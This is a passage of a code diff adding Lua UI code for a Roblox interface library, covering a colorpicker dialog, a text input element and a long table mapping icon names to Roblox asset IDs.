+					Parent = TransparencyDragHolder,
+					ThemeTag = {
+						ImageColor3 = "DialogInput",
+					},
+				})
+
+				TransparencyColor = New("Frame", {
+					Size = UDim2.fromScale(1, 1),
+				}, {
+					New("UIGradient", {
+						Transparency = NumberSequence.new({
+							NumberSequenceKeypoint.new(0, 0),
+							NumberSequenceKeypoint.new(1, 1),
+						}),
+						Rotation = 270,
+					}),
+					New("UICorner", {
+						CornerRadius = UDim.new(1, 0),
+					}),
+				})
+
+				TransparencySlider = New("Frame", {
+					Size = UDim2.fromOffset(12, 190),
+					Position = UDim2.fromOffset(230, 55),
+					Parent = Dialog.Root,
+					BackgroundTransparency = 1,
+				}, {
+					New("UICorner", {
+						CornerRadius = UDim.new(1, 0),
+					}),
+					New("ImageLabel", {
+						Image = "http://www.roblox.com/asset/?id=14204231522",
+						ImageTransparency = 0.45,
+						ScaleType = Enum.ScaleType.Tile,
+						TileSize = UDim2.fromOffset(40, 40),
+						BackgroundTransparency = 1,
+						Size = UDim2.fromScale(1, 1),
+						Parent = Dialog.Root,
+					}, {
+						New("UICorner", {
+							CornerRadius = UDim.new(1, 0),
+						}),
+					}),
+					TransparencyColor,
+					TransparencyDragHolder,
+				})
+			end
+
+			local function Display()
+				SatVibMap.BackgroundColor3 = Color3.fromHSV(Hue, 1, 1)
+				HueDrag.Position = UDim2.new(0, -1, Hue, -6)
+				SatCursor.Position = UDim2.new(Sat, 0, 1 - Vib, 0)
+				DialogDisplayFrame.BackgroundColor3 = Color3.fromHSV(Hue, Sat, Vib)
+
+				HexInput.Input.Text = "#" .. Color3.fromHSV(Hue, Sat, Vib):ToHex()
+				RedInput.Input.Text = GetRGB()["R"]
+				GreenInput.Input.Text = GetRGB()["G"]
+				BlueInput.Input.Text = GetRGB()["B"]
+
+				if Config.Transparency then
+					TransparencyColor.BackgroundColor3 = Color3.fromHSV(Hue, Sat, Vib)
+					DialogDisplayFrame.BackgroundTransparency = Transparency
+					TransparencyDrag.Position = UDim2.new(0, -1, 1 - Transparency, -6)
+					AlphaInput.Input.Text = Library:Round((1 - Transparency) * 100, 0) .. "%"
+				end
+			end
+
+			Creator.AddSignal(HexInput.Input.FocusLost, function(Enter)
+				if Enter then
+					local Success, Result = pcall(Color3.fromHex, HexInput.Input.Text)
+					if Success and typeof(Result) == "Color3" then
+						Hue, Sat, Vib = Color3.toHSV(Result)
+					end
+				end
+				Display()
+			end)
+
+			Creator.AddSignal(RedInput.Input.FocusLost, function(Enter)
+				if Enter then
+					local CurrentColor = GetRGB()
+					local Success, Result = pcall(Color3.fromRGB, RedInput.Input.Text, CurrentColor["G"], CurrentColor["B"])
+					if Success and typeof(Result) == "Color3" then
+						if tonumber(RedInput.Input.Text) <= 255 then
+							Hue, Sat, Vib = Color3.toHSV(Result)
+						end
+					end
+				end
+				Display()
+			end)
+
+			Creator.AddSignal(GreenInput.Input.FocusLost, function(Enter)
+				if Enter then
+					local CurrentColor = GetRGB()
+					local Success, Result =
+						pcall(Color3.fromRGB, CurrentColor["R"], GreenInput.Input.Text, CurrentColor["B"])
+					if Success and typeof(Result) == "Color3" then
+						if tonumber(GreenInput.Input.Text) <= 255 then
+							Hue, Sat, Vib = Color3.toHSV(Result)
+						end
+					end
+				end
+				Display()
+			end)
+
+			Creator.AddSignal(BlueInput.Input.FocusLost, function(Enter)
+				if Enter then
+					local CurrentColor = GetRGB()
+					local Success, Result =
+						pcall(Color3.fromRGB, CurrentColor["R"], CurrentColor["G"], BlueInput.Input.Text)
+					if Success and typeof(Result) == "Color3" then
+						if tonumber(BlueInput.Input.Text) <= 255 then
+							Hue, Sat, Vib = Color3.toHSV(Result)
+						end
+					end
+				end
+				Display()
+			end)
+
+			if Config.Transparency then
+				Creator.AddSignal(AlphaInput.Input.FocusLost, function(Enter)
+					if Enter then
+						pcall(function()
+							local Value = tonumber(AlphaInput.Input.Text)
+							if Value >= 0 and Value <= 100 then
+								Transparency = 1 - Value * 0.01
+							end
+						end)
+					end
+					Display()
+				end)
+			end
+
+			Creator.AddSignal(SatVibMap.InputBegan, function(Input)
+				if
+					Input.UserInputType == Enum.UserInputType.MouseButton1
+					or Input.UserInputType == Enum.UserInputType.Touch
+				then
+					while UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) do
+						local MinX = SatVibMap.AbsolutePosition.X
+						local MaxX = MinX + SatVibMap.AbsoluteSize.X
+						local MouseX = math.clamp(Mouse.X, MinX, MaxX)
+
+						local MinY = SatVibMap.AbsolutePosition.Y
+						local MaxY = MinY + SatVibMap.AbsoluteSize.Y
+						local MouseY = math.clamp(Mouse.Y, MinY, MaxY)
+
+						Sat = (MouseX - MinX) / (MaxX - MinX)
+						Vib = 1 - ((MouseY - MinY) / (MaxY - MinY))
+						Display()
+
+						RenderStepped:Wait()
+					end
+				end
+			end)
+
+			Creator.AddSignal(HueSlider.InputBegan, function(Input)
+				if
+					Input.UserInputType == Enum.UserInputType.MouseButton1
+					or Input.UserInputType == Enum.UserInputType.Touch
+				then
+					while UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) do
+						local MinY = HueSlider.AbsolutePosition.Y
+						local MaxY = MinY + HueSlider.AbsoluteSize.Y
+						local MouseY = math.clamp(Mouse.Y, MinY, MaxY)
+
+						Hue = ((MouseY - MinY) / (MaxY - MinY))
+						Display()
+
+						RenderStepped:Wait()
+					end
+				end
+			end)
+
+			if Config.Transparency then
+				Creator.AddSignal(TransparencySlider.InputBegan, function(Input)
+					if Input.UserInputType == Enum.UserInputType.MouseButton1 then
+						while UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) do
+							local MinY = TransparencySlider.AbsolutePosition.Y
+							local MaxY = MinY + TransparencySlider.AbsoluteSize.Y
+							local MouseY = math.clamp(Mouse.Y, MinY, MaxY)
+
+							Transparency = 1 - ((MouseY - MinY) / (MaxY - MinY))
+							Display()
+
+							RenderStepped:Wait()
+						end
+					end
+				end)
+			end
+
+			Display()
+
+			Dialog:Button("Done", function()
+				Colorpicker:SetValue({ Hue, Sat, Vib }, Transparency)
+			end)
+			Dialog:Button("Cancel")
+			Dialog:Open()
+		end
+
+		function Colorpicker:Display()
+			Colorpicker.Value = Color3.fromHSV(Colorpicker.Hue, Colorpicker.Sat, Colorpicker.Vib)
+
+			DisplayFrameColor.BackgroundColor3 = Colorpicker.Value
+			DisplayFrameColor.BackgroundTransparency = Colorpicker.Transparency
+
+			Element.Library:SafeCallback(Colorpicker.Callback, Colorpicker.Value)
+			Element.Library:SafeCallback(Colorpicker.Changed, Colorpicker.Value)
+		end
+
+		function Colorpicker:SetValue(HSV, Transparency)
+			local Color = Color3.fromHSV(HSV[1], HSV[2], HSV[3])
+
+			Colorpicker.Transparency = Transparency or 0
+			Colorpicker:SetHSVFromRGB(Color)
+			Colorpicker:Display()
+		end
+
+		function Colorpicker:SetValueRGB(Color, Transparency)
+			Colorpicker.Transparency = Transparency or 0
+			Colorpicker:SetHSVFromRGB(Color)
+			Colorpicker:Display()
+		end
+
+		function Colorpicker:OnChanged(Func)
+			Colorpicker.Changed = Func
+			Func(Colorpicker.Value)
+		end
+
+		function Colorpicker:Destroy()
+			ColorpickerFrame:Destroy()
+			Library.Options[Idx] = nil
+		end
+
+		Creator.AddSignal(ColorpickerFrame.Frame.MouseButton1Click, function()
+			CreateColorDialog()
+		end)
+
+		Creator.AddSignal(ColorpickerFrame.Frame.InputBegan, function(Input)
+			if Input.UserInputType == Enum.UserInputType.Touch then
+				CreateColorDialog()
+			end
+		end)
+
+		Colorpicker:Display()
+
+		Library.Options[Idx] = Colorpicker
+		return Colorpicker
+	end
+
+	return Element
+end)()
+ElementsTable.Input = (function()
+	local Element = {}
+	Element.__index = Element
+	Element.__type = "Input"
+
+	function Element:New(Idx, Config)
+		assert(Config.Title, "Input - Missing Title")
+		Config.Callback = Config.Callback or function() end
+
+		local Input = {
+			Value = Config.Default or "",
+			Numeric = Config.Numeric or false,
+			Finished = Config.Finished or false,
+			Callback = Config.Callback or function(Value) end,
+			Type = "Input",
+		}
+
+		local InputFrame = Components.Element(Config.Title, Config.Description, self.Container, false)
+
+		Input.SetTitle = InputFrame.SetTitle
+		Input.SetDesc = InputFrame.SetDesc
+		Input.Visible = InputFrame.Visible
+		Input.Elements = InputFrame
+
+		local Textbox = Components.Textbox(InputFrame.Frame, true)
+		Textbox.Frame.Position = UDim2.new(1, -10, 0.5, 0)
+		Textbox.Frame.AnchorPoint = Vector2.new(1, 0.5)
+		Textbox.Frame.Size = UDim2.fromOffset(160, 30)
+		Textbox.Input.Text = Config.Default or ""
+		Textbox.Input.PlaceholderText = Config.Placeholder or ""
+
+		local Box = Textbox.Input
+
+		function Input:SetValue(Text)
+			if Config.MaxLength and #Text > Config.MaxLength then
+				Text = Text:sub(1, Config.MaxLength)
+			end
+
+			if Input.Numeric then
+				if (not tonumber(Text)) and Text:len() > 0 then
+					Text = Input.Value
+				end
+			end
+
+			Input.Value = Text
+			Box.Text = Text
+
+			Library:SafeCallback(Input.Callback, Input.Value)
+			Library:SafeCallback(Input.Changed, Input.Value)
+		end
+
+		if Input.Finished then
+			AddSignal(Box.FocusLost, function(enter)
+				if not enter then
+					return
+				end
+				Input:SetValue(Box.Text)
+			end)
+		else
+			AddSignal(Box:GetPropertyChangedSignal("Text"), function()
+				Input:SetValue(Box.Text)
+			end)
+		end
+
+		function Input:OnChanged(Func)
+			Input.Changed = Func
+			Func(Input.Value)
+		end
+
+		function Input:Destroy()
+			InputFrame:Destroy()
+			Library.Options[Idx] = nil
+		end
+
+		Library.Options[Idx] = Input
+		return Input
+	end
+
+	return Element
+end)()
+
+local NotificationModule = Components.Notification
+NotificationModule:Init(GUI)
+
+local New = Creator.New
+
+local Icons = {
+	["lucide-accessibility"] = "rbxassetid://10709751939",
+	["lucide-activity"] = "rbxassetid://10709752035",
+	["lucide-air-vent"] = "rbxassetid://10709752131",
+	["lucide-airplay"] = "rbxassetid://10709752254",
+	["lucide-alarm-check"] = "rbxassetid://10709752405",
+	["lucide-alarm-clock"] = "rbxassetid://10709752630",
+	["lucide-alarm-clock-off"] = "rbxassetid://10709752508",
+	["lucide-alarm-minus"] = "rbxassetid://10709752732",
+	["lucide-alarm-plus"] = "rbxassetid://10709752825",
+	["lucide-album"] = "rbxassetid://10709752906",
+	["lucide-alert-circle"] = "rbxassetid://10709752996",
+	["lucide-alert-octagon"] = "rbxassetid://10709753064",
+	["lucide-alert-triangle"] = "rbxassetid://10709753149",
+	["lucide-align-center"] = "rbxassetid://10709753570",
+	["lucide-align-center-horizontal"] = "rbxassetid://10709753272",
+	["lucide-align-center-vertical"] = "rbxassetid://10709753421",
+	["lucide-align-end-horizontal"] = "rbxassetid://10709753692",
+	["lucide-align-end-vertical"] = "rbxassetid://10709753808",
+	["lucide-align-horizontal-distribute-center"] = "rbxassetid://10747779791",
+	["lucide-align-horizontal-distribute-end"] = "rbxassetid://10747784534",
+	["lucide-align-horizontal-distribute-start"] = "rbxassetid://10709754118",
+	["lucide-align-horizontal-justify-center"] = "rbxassetid://10709754204",
+	["lucide-align-horizontal-justify-end"] = "rbxassetid://10709754317",
+	["lucide-align-horizontal-justify-start"] = "rbxassetid://10709754436",
+	["lucide-align-horizontal-space-around"] = "rbxassetid://10709754590",
+	["lucide-align-horizontal-space-between"] = "rbxassetid://10709754749",
+	["lucide-align-justify"] = "rbxassetid://10709759610",
+	["lucide-align-left"] = "rbxassetid://10709759764",
+	["lucide-align-right"] = "rbxassetid://10709759895",
+	["lucide-align-start-horizontal"] = "rbxassetid://10709760051",
+	["lucide-align-start-vertical"] = "rbxassetid://10709760244",
+	["lucide-align-vertical-distribute-center"] = "rbxassetid://10709760351",
+	["lucide-align-vertical-distribute-end"] = "rbxassetid://10709760434",
+	["lucide-align-vertical-distribute-start"] = "rbxassetid://10709760612",
+	["lucide-align-vertical-justify-center"] = "rbxassetid://10709760814",
+	["lucide-align-vertical-justify-end"] = "rbxassetid://10709761003",
+	["lucide-align-vertical-justify-start"] = "rbxassetid://10709761176",
+	["lucide-align-vertical-space-around"] = "rbxassetid://10709761324",
+	["lucide-align-vertical-space-between"] = "rbxassetid://10709761434",
+	["lucide-anchor"] = "rbxassetid://10709761530",
+	["lucide-angry"] = "rbxassetid://10709761629",
+	["lucide-annoyed"] = "rbxassetid://10709761722",
+	["lucide-aperture"] = "rbxassetid://10709761813",
+	["lucide-apple"] = "rbxassetid://10709761889",
+	["lucide-archive"] = "rbxassetid://10709762233",
+	["lucide-archive-restore"] = "rbxassetid://10709762058",
+	["lucide-armchair"] = "rbxassetid://10709762327",
+	["lucide-anvil"] = "rbxassetid://77943964625400",
+	["lucide-arrow-big-down"] = "rbxassetid://10747796644",
+	["lucide-arrow-big-left"] = "rbxassetid://10709762574",
+	["lucide-arrow-big-right"] = "rbxassetid://10709762727",
+	["lucide-arrow-big-up"] = "rbxassetid://10709762879",
+	["lucide-arrow-down"] = "rbxassetid://10709767827",
+	["lucide-arrow-down-circle"] = "rbxassetid://10709763034",
+	["lucide-arrow-down-left"] = "rbxassetid://10709767656",
+	["lucide-arrow-down-right"] = "rbxassetid://10709767750",
+	["lucide-arrow-left"] = "rbxassetid://10709768114",
+	["lucide-arrow-left-circle"] = "rbxassetid://10709767936",
+	["lucide-arrow-left-right"] = "rbxassetid://10709768019",
+	["lucide-arrow-right"] = "rbxassetid://10709768347",
+	["lucide-arrow-right-circle"] = "rbxassetid://10709768226",
+	["lucide-arrow-up"] = "rbxassetid://10709768939",
+	["lucide-arrow-up-circle"] = "rbxassetid://10709768432",
+	["lucide-arrow-up-down"] = "rbxassetid://10709768538",
+	["lucide-arrow-up-left"] = "rbxassetid://10709768661",
+	["lucide-arrow-up-right"] = "rbxassetid://10709768787",
+	["lucide-asterisk"] = "rbxassetid://10709769095",
+	["lucide-at-sign"] = "rbxassetid://10709769286",
+	["lucide-award"] = "rbxassetid://10709769406",
+	["lucide-axe"] = "rbxassetid://10709769508",
+	["lucide-axis-3d"] = "rbxassetid://10709769598",
+	["lucide-baby"] = "rbxassetid://10709769732",
+	["lucide-backpack"] = "rbxassetid://10709769841",
+	["lucide-baggage-claim"] = "rbxassetid://10709769935",
+	["lucide-banana"] = "rbxassetid://10709770005",
+	["lucide-banknote"] = "rbxassetid://10709770178",
+	["lucide-bar-chart"] = "rbxassetid://10709773755",
+	["lucide-bar-chart-2"] = "rbxassetid://10709770317",
+	["lucide-bar-chart-3"] = "rbxassetid://10709770431",
+	["lucide-bar-chart-4"] = "rbxassetid://10709770560",
+	["lucide-bar-chart-horizontal"] = "rbxassetid://10709773669",
+	["lucide-barcode"] = "rbxassetid://10747360675",
+	["lucide-baseline"] = "rbxassetid://10709773863",
+	["lucide-bath"] = "rbxassetid://10709773963",
+	["lucide-battery"] = "rbxassetid://10709774640",
+	["lucide-battery-charging"] = "rbxassetid://10709774068",
+	["lucide-battery-full"] = "rbxassetid://10709774206",
+	["lucide-battery-low"] = "rbxassetid://10709774370",
+	["lucide-battery-medium"] = "rbxassetid://10709774513",
+	["lucide-beaker"] = "rbxassetid://10709774756",
+	["lucide-bed"] = "rbxassetid://10709775036",
+	["lucide-bed-double"] = "rbxassetid://10709774864",
+	["lucide-bed-single"] = "rbxassetid://10709774968",
+	["lucide-beer"] = "rbxassetid://10709775167",
+	["lucide-bell"] = "rbxassetid://10709775704",
+	["lucide-bell-minus"] = "rbxassetid://10709775241",
+	["lucide-bell-off"] = "rbxassetid://10709775320",
+	["lucide-bell-plus"] = "rbxassetid://10709775448",
+	["lucide-bell-ring"] = "rbxassetid://10709775560",
+	["lucide-bike"] = "rbxassetid://10709775894",
+	["lucide-binary"] = "rbxassetid://10709776050",
+	["lucide-bitcoin"] = "rbxassetid://10709776126",
+	["lucide-bluetooth"] = "rbxassetid://10709776655",
+	["lucide-bluetooth-connected"] = "rbxassetid://10709776240",
+	["lucide-bluetooth-off"] = "rbxassetid://10709776344",
+	["lucide-bluetooth-searching"] = "rbxassetid://10709776501",
+	["lucide-bold"] = "rbxassetid://10747813908",
+	["lucide-bomb"] = "rbxassetid://10709781460",
+	["lucide-bone"] = "rbxassetid://10709781605",
+	["lucide-book"] = "rbxassetid://10709781824",
+	["lucide-book-open"] = "rbxassetid://10709781717",
+	["lucide-bookmark"] = "rbxassetid://10709782154",
+	["lucide-bookmark-minus"] = "rbxassetid://10709781919",
+	["lucide-bookmark-plus"] = "rbxassetid://10709782044",
+	["lucide-bot"] = "rbxassetid://10709782230",
+	["lucide-box"] = "rbxassetid://10709782497",
+	["lucide-box-select"] = "rbxassetid://10709782342",
+	["lucide-boxes"] = "rbxassetid://10709782582",
+	["lucide-briefcase"] = "rbxassetid://10709782662",
+	["lucide-brush"] = "rbxassetid://10709782758",
+	["lucide-bug"] = "rbxassetid://10709782845",
+	["lucide-building"] = "rbxassetid://10709783051",
+	["lucide-building-2"] = "rbxassetid://10709782939",
+	["lucide-bus"] = "rbxassetid://10709783137",
+	["lucide-cake"] = "rbxassetid://10709783217",
+	["lucide-calculator"] = "rbxassetid://10709783311",
+	["lucide-calendar"] = "rbxassetid://10709789505",
+	["lucide-calendar-check"] = "rbxassetid://10709783474",
+	["lucide-calendar-check-2"] = "rbxassetid://10709783392",
+	["lucide-calendar-clock"] = "rbxassetid://10709783577",
+	["lucide-calendar-days"] = "rbxassetid://10709783673",
+	["lucide-calendar-heart"] = "rbxassetid://10709783835",
+	["lucide-calendar-minus"] = "rbxassetid://10709783959",
+	["lucide-calendar-off"] = "rbxassetid://10709788784",
+	["lucide-calendar-plus"] = "rbxassetid://10709788937",
+	["lucide-calendar-range"] = "rbxassetid://10709789053",
+	["lucide-calendar-search"] = "rbxassetid://10709789200",
+	["lucide-calendar-x"] = "rbxassetid://10709789407",
+	["lucide-calendar-x-2"] = "rbxassetid://10709789329",
+	["lucide-camera"] = "rbxassetid://10709789686",
+	["lucide-camera-off"] = "rbxassetid://10747822677",
+	["lucide-car"] = "rbxassetid://10709789810",
+	["lucide-carrot"] = "rbxassetid://10709789960",
+	["lucide-cast"] = "rbxassetid://10709790097",
+	["lucide-charge"] = "rbxassetid://10709790202",
+	["lucide-check"] = "rbxassetid://10709790644",
+	["lucide-check-circle"] = "rbxassetid://10709790387",
+	["lucide-check-circle-2"] = "rbxassetid://10709790298",
+	["lucide-check-square"] = "rbxassetid://10709790537",
+	["lucide-chef-hat"] = "rbxassetid://10709790757",
+	["lucide-cherry"] = "rbxassetid://10709790875",
+	["lucide-chevron-down"] = "rbxassetid://10709790948",
+	["lucide-chevron-first"] = "rbxassetid://10709791015",
+	["lucide-chevron-last"] = "rbxassetid://10709791130",
+	["lucide-chevron-left"] = "rbxassetid://10709791281",
+	["lucide-chevron-right"] = "rbxassetid://10709791437",
+	["lucide-chevron-up"] = "rbxassetid://10709791523",
+	["lucide-chevrons-down"] = "rbxassetid://10709796864",
+	["lucide-chevrons-down-up"] = "rbxassetid://10709791632",
+	["lucide-chevrons-left"] = "rbxassetid://10709797151",
+	["lucide-chevrons-left-right"] = "rbxassetid://10709797006",
+	["lucide-chevrons-right"] = "rbxassetid://10709797382",
+	["lucide-chevrons-right-left"] = "rbxassetid://10709797274",
+	["lucide-chevrons-up"] = "rbxassetid://10709797622",
+	["lucide-chevrons-up-down"] = "rbxassetid://10709797508",
+	["lucide-chrome"] = "rbxassetid://10709797725",
+	["lucide-circle"] = "rbxassetid://10709798174",
+	["lucide-circle-dot"] = "rbxassetid://10709797837",
+	["lucide-circle-ellipsis"] = "rbxassetid://10709797985",
+	["lucide-circle-slashed"] = "rbxassetid://10709798100",
+	["lucide-citrus"] = "rbxassetid://10709798276",
+	["lucide-clapperboard"] = "rbxassetid://10709798350",
+	["lucide-clipboard"] = "rbxassetid://10709799288",
+	["lucide-clipboard-check"] = "rbxassetid://10709798443",
+	["lucide-clipboard-copy"] = "rbxassetid://10709798574",
+	["lucide-clipboard-edit"] = "rbxassetid://10709798682",
+	["lucide-clipboard-list"] = "rbxassetid://10709798792",
+	["lucide-clipboard-signature"] = "rbxassetid://10709798890",
+	["lucide-clipboard-type"] = "rbxassetid://10709798999",
+	["lucide-clipboard-x"] = "rbxassetid://10709799124",
+	["lucide-clock"] = "rbxassetid://10709805144",
+	["lucide-clock-1"] = "rbxassetid://10709799535",
+	["lucide-clock-10"] = "rbxassetid://10709799718",
+	["lucide-clock-11"] = "rbxassetid://10709799818",
+	["lucide-clock-12"] = "rbxassetid://10709799962",
+	["lucide-clock-2"] = "rbxassetid://10709803876",
+	["lucide-clock-3"] = "rbxassetid://10709803989",
+	["lucide-clock-4"] = "rbxassetid://10709804164",
+	["lucide-clock-5"] = "rbxassetid://10709804291",
+	["lucide-clock-6"] = "rbxassetid://10709804435",
+	["lucide-clock-7"] = "rbxassetid://10709804599",
+	["lucide-clock-8"] = "rbxassetid://10709804784",
+	["lucide-clock-9"] = "rbxassetid://10709804996",
+	["lucide-cloud"] = "rbxassetid://10709806740",
+	["lucide-cloud-cog"] = "rbxassetid://10709805262",
+	["lucide-cloud-drizzle"] = "rbxassetid://10709805371",
+	["lucide-cloud-fog"] = "rbxassetid://10709805477",
+	["lucide-cloud-hail"] = "rbxassetid://10709805596",
+	["lucide-cloud-lightning"] = "rbxassetid://10709805727",
+	["lucide-cloud-moon"] = "rbxassetid://10709805942",
+	["lucide-cloud-moon-rain"] = "rbxassetid://10709805838",
+	["lucide-cloud-off"] = "rbxassetid://10709806060",
+	["lucide-cloud-rain"] = "rbxassetid://10709806277",
+	["lucide-cloud-rain-wind"] = "rbxassetid://10709806166",
+	["lucide-cloud-snow"] = "rbxassetid://10709806374",
+	["lucide-cloud-sun"] = "rbxassetid://10709806631",
+	["lucide-cloud-sun-rain"] = "rbxassetid://10709806475",
+	["lucide-cloudy"] = "rbxassetid://10709806859",
+	["lucide-clover"] = "rbxassetid://10709806995",
+	["lucide-code"] = "rbxassetid://10709810463",
+	["lucide-code-2"] = "rbxassetid://10709807111",
+	["lucide-codepen"] = "rbxassetid://10709810534",
+	["lucide-codesandbox"] = "rbxassetid://10709810676",
+	["lucide-coffee"] = "rbxassetid://10709810814",
+	["lucide-cog"] = "rbxassetid://10709810948",
+	["lucide-coins"] = "rbxassetid://10709811110",
+	["lucide-columns"] = "rbxassetid://10709811261",
+	["lucide-command"] = "rbxassetid://10709811365",
+	["lucide-compass"] = "rbxassetid://10709811445",
+	["lucide-component"] = "rbxassetid://10709811595",
+	["lucide-concierge-bell"] = "rbxassetid://10709811706",
+	["lucide-connection"] = "rbxassetid://10747361219",
+	["lucide-contact"] = "rbxassetid://10709811834",
+	["lucide-contrast"] = "rbxassetid://10709811939",
+	["lucide-cookie"] = "rbxassetid://10709812067",
+	["lucide-copy"] = "rbxassetid://10709812159",
+	["lucide-copyleft"] = "rbxassetid://10709812251",
+	["lucide-copyright"] = "rbxassetid://10709812311",
+	["lucide-corner-down-left"] = "rbxassetid://10709812396",
+	["lucide-corner-down-right"] = "rbxassetid://10709812485",
+	["lucide-corner-left-down"] = "rbxassetid://10709812632",
+	["lucide-corner-left-up"] = "rbxassetid://10709812784",
+	["lucide-corner-right-down"] = "rbxassetid://10709812939",
+	["lucide-corner-right-up"] = "rbxassetid://10709813094",
+	["lucide-corner-up-left"] = "rbxassetid://10709813185",
+	["lucide-corner-up-right"] = "rbxassetid://10709813281",
+	["lucide-cpu"] = "rbxassetid://10709813383",
+	["lucide-croissant"] = "rbxassetid://10709818125",
+	["lucide-crop"] = "rbxassetid://10709818245",
+	["lucide-cross"] = "rbxassetid://10709818399",
+	["lucide-crosshair"] = "rbxassetid://10709818534",
+	["lucide-crown"] = "rbxassetid://10709818626",
+	["lucide-cup-soda"] = "rbxassetid://10709818763",
+	["lucide-curly-braces"] = "rbxassetid://10709818847",
+	["lucide-currency"] = "rbxassetid://10709818931",
+	["lucide-container"] = "rbxassetid://17466205552",
+	["lucide-database"] = "rbxassetid://10709818996",
+	["lucide-delete"] = "rbxassetid://10709819059",
+	["lucide-diamond"] = "rbxassetid://10709819149",
+	["lucide-dice-1"] = "rbxassetid://10709819266",
+	["lucide-dice-2"] = "rbxassetid://10709819361",
+	["lucide-dice-3"] = "rbxassetid://10709819508",
+	["lucide-dice-4"] = "rbxassetid://10709819670",
+	["lucide-dice-5"] = "rbxassetid://10709819801",
+	["lucide-dice-6"] = "rbxassetid://10709819896",
+	["lucide-dices"] = "rbxassetid://10723343321",
+	["lucide-diff"] = "rbxassetid://10723343416",
+	["lucide-disc"] = "rbxassetid://10723343537",
+	["lucide-divide"] = "rbxassetid://10723343805",
+	["lucide-divide-circle"] = "rbxassetid://10723343636",
+	["lucide-divide-square"] = "rbxassetid://10723343737",
+	["lucide-dollar-sign"] = "rbxassetid://10723343958",
+	["lucide-download"] = "rbxassetid://10723344270",
+	["lucide-download-cloud"] = "rbxassetid://10723344088",
+	["lucide-door-open"] = "rbxassetid://124179241653522",
+	["lucide-droplet"] = "rbxassetid://10723344432",
+	["lucide-droplets"] = "rbxassetid://10734883356",
+	["lucide-drumstick"] = "rbxassetid://10723344737",
+	["lucide-edit"] = "rbxassetid://10734883598",
+	["lucide-edit-2"] = "rbxassetid://10723344885",
+	["lucide-edit-3"] = "rbxassetid://10723345088",
+	["lucide-egg"] = "rbxassetid://10723345518",
+	["lucide-egg-fried"] = "rbxassetid://10723345347",
+	["lucide-electricity"] = "rbxassetid://10723345749",
+	["lucide-electricity-off"] = "rbxassetid://10723345643",
+	["lucide-equal"] = "rbxassetid://10723345990",
+	["lucide-equal-not"] = "rbxassetid://10723345866",
+	["lucide-eraser"] = "rbxassetid://10723346158",
+	["lucide-euro"] = "rbxassetid://10723346372",
+	["lucide-expand"] = "rbxassetid://10723346553",
+	["lucide-external-link"] = "rbxassetid://10723346684",
+	["lucide-eye"] = "rbxassetid://10723346959",
+	["lucide-eye-off"] = "rbxassetid://10723346871",
+	["lucide-factory"] = "rbxassetid://10723347051",
+	["lucide-fan"] = "rbxassetid://10723354359",
+	["lucide-fast-forward"] = "rbxassetid://10723354521",
+	["lucide-feather"] = "rbxassetid://10723354671",
+	["lucide-figma"] = "rbxassetid://10723354801",
+	["lucide-file"] = "rbxassetid://10723374641",
+	["lucide-file-archive"] = "rbxassetid://10723354921",
+	["lucide-file-audio"] = "rbxassetid://10723355148",
+	["lucide-file-audio-2"] = "rbxassetid://10723355026",
+	["lucide-file-axis-3d"] = "rbxassetid://10723355272",
+	["lucide-file-badge"] = "rbxassetid://10723355622",
+	["lucide-file-badge-2"] = "rbxassetid://10723355451",
+	["lucide-file-bar-chart"] = "rbxassetid://10723355887",
+	["lucide-file-bar-chart-2"] = "rbxassetid://10723355746",
+	["lucide-file-box"] = "rbxassetid://10723355989",
+	["lucide-file-check"] = "rbxassetid://10723356210",
+	["lucide-file-check-2"] = "rbxassetid://10723356100",
+	["lucide-file-clock"] = "rbxassetid://10723356329",
+	["lucide-file-code"] = "rbxassetid://10723356507",
+	["lucide-file-cog"] = "rbxassetid://10723356830",
+	["lucide-file-cog-2"] = "rbxassetid://10723356676",
+	["lucide-file-diff"] = "rbxassetid://10723357039",
+	["lucide-file-digit"] = "rbxassetid://10723357151",
+	["lucide-file-down"] = "rbxassetid://10723357322",
+	["lucide-file-edit"] = "rbxassetid://10723357495",
+	["lucide-file-heart"] = "rbxassetid://10723357637",
+	["lucide-file-image"] = "rbxassetid://10723357790",
+	["lucide-file-input"] = "rbxassetid://10723357933",
+	["lucide-file-json"] = "rbxassetid://10723364435",
+	["lucide-file-json-2"] = "rbxassetid://10723364361",
+	["lucide-file-key"] = "rbxassetid://10723364605",
+	["lucide-file-key-2"] = "rbxassetid://10723364515",
+	["lucide-file-line-chart"] = "rbxassetid://10723364725",
+	["lucide-file-lock"] = "rbxassetid://10723364957",
+	["lucide-file-lock-2"] = "rbxassetid://10723364861",
+	["lucide-file-minus"] = "rbxassetid://10723365254",
+	["lucide-file-minus-2"] = "rbxassetid://10723365086",
+	["lucide-file-output"] = "rbxassetid://10723365457",
+	["lucide-file-pie-chart"] = "rbxassetid://10723365598",
+	["lucide-file-plus"] = "rbxassetid://10723365877",
+	["lucide-file-plus-2"] = "rbxassetid://10723365766",
+	["lucide-file-question"] = "rbxassetid://10723365987",
+	["lucide-file-scan"] = "rbxassetid://10723366167",
+	["lucide-file-search"] = "rbxassetid://10723366550",
+	["lucide-file-search-2"] = "rbxassetid://10723366340",
+	["lucide-file-signature"] = "rbxassetid://10723366741",
+	["lucide-file-spreadsheet"] = "rbxassetid://10723366962",
+	["lucide-file-symlink"] = "rbxassetid://10723367098",
+	["lucide-file-terminal"] = "rbxassetid://10723367244",
+	["lucide-file-text"] = "rbxassetid://10723367380",
+	["lucide-file-type"] = "rbxassetid://10723367606",
+	["lucide-file-type-2"] = "rbxassetid://10723367509",
+	["lucide-file-up"] = "rbxassetid://10723367734",
+	["lucide-file-video"] = "rbxassetid://10723373884",
+	["lucide-file-video-2"] = "rbxassetid://10723367834",
+	["lucide-file-volume"] = "rbxassetid://10723374172",
+	["lucide-file-volume-2"] = "rbxassetid://10723374030",
+	["lucide-file-warning"] = "rbxassetid://10723374276",
+	["lucide-file-x"] = "rbxassetid://10723374544",
+	["lucide-file-x-2"] = "rbxassetid://10723374378",
+	["lucide-files"] = "rbxassetid://10723374759",
+	["lucide-film"] = "rbxassetid://10723374981",
+	["lucide-filter"] = "rbxassetid://10723375128",
+	["lucide-fingerprint"] = "rbxassetid://10723375250",
+	["lucide-flag"] = "rbxassetid://10723375890",
+	["lucide-flag-off"] = "rbxassetid://10723375443",
+	["lucide-flag-triangle-left"] = "rbxassetid://10723375608",
+	["lucide-flag-triangle-right"] = "rbxassetid://10723375727",
+	["lucide-flame"] = "rbxassetid://10723376114",
